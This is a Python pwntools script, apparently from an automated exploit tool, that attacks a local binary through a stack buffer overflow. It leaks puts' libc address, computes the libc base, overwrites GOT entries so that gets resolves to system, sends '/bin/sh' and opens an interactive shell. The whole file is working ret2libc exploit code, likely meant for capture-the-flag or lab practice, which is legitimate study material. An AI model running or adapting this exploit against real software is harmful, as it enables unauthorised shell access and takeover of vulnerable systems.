from pwn import *
from autopwner_helpers import *
import sys
import time

binary_name = sys.argv[1]
elf=ELF(binary_name)

bytes_in_an_address = 4
pack_int = p32
if (elf.bits == 64):
    pack_int = p64
    bytes_in_an_address = 8
print(elf.bits)

offset_to_ebp = determine_offset_to_ebp(binary_name, elf)
offset_to_return_address = offset_to_ebp + bytes_in_an_address
print(offset_to_return_address)

if elf.bits == 32:
    libc = ELF("/lib/i386-linux-gnu/libc.so.6")
else:
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

puts_offset_from_libc_base = libc.symbols['puts']

p = process(binary_name)
intro = p.recv()
print(intro)

payload = b"A"*offset_to_return_address

if (elf.bits == 32):
    payload += sledgehammer32_payload1_after_offset(binary_name, elf)
else:
    payload += sledgehammer64_payload1_after_offset(binary_name, elf)
    
p.sendline(payload)
print(payload)
leak = p.recv()
print(leak)

if elf.bits == 32:
    puts_libc_address = readleak32(leak, puts_offset_from_libc_base)
else:
    puts_libc_address = readleak64(leak, puts_offset_from_libc_base)

print(hex(puts_libc_address))
libc_base_address = puts_libc_address - puts_offset_from_libc_base
libc.address = libc_base_address

# try:
byte_diff = elf.got["gets"] - elf.got["puts"]
# except:
#     byte_diff = elf.got["fgets"] - elf.got["puts"]
    
if (byte_diff > 0):
    num_gets = int(byte_diff/bytes_in_an_address)
else:
    num_gets = 0

p.sendline(pack_int(libc.symbols["system"]) + pack_int(libc.symbols['gets'])*num_gets)
p.sendline(b"/bin/sh\x00")
p.interactive()

